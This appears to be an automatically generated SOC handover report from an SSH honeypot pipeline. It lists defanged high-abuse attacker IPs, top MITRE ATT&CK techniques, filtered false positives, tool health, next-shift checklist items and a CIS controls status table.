| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `193.90.12[.]122` | NO | GLOBALCONNECT AS | **100** ⚠️ | 50 |
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `45.79.115[.]134` | US | Linode | **100** ⚠️ | 50 |
| `172.236.228[.]38` | US | Linode | **100** ⚠️ | 50 |
| `193.32.162[.]84` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `216.244.201[.]41` | AR | Sinectis S.A. | **100** ⚠️ | 4 |
| `107.150.146[.]69` | US | Internap Network Services Corporation | **100** ⚠️ | 50 |
| `46.201.15[.]135` | UA | JSC Ukrtelecom | **100** ⚠️ | 1 |
| `45.77.61[.]56` | FR | Vultr Holdings, LLC | **100** ⚠️ | 50 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 168 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 154 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 101 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 99 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 99 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 362 cases |
| Tool 34  | Credential Extractor        | ✅ 203 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 87 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 48 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 154 priority case(s) shown individually · 44 recon entry/entries in table (17 group(s) consolidating 145 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-05T13:21:03Z_
